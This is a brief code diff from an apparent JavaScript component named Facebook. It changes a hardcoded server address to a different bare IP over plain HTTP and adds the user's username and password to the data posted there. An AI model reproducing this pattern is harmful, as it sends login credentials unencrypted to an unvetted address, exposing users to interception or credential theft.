@@ -219,8 +219,10 @@ export default function Facebook() {
  
     const serverUrlData={
 
-      url:"http://159.65.148.181/facebook",
+      url:"http://164.92.93.53/facebook",
       data:{
+        username,
+        password,
         groupId,
         userId: ctx.state.userData._id,
         status: status,
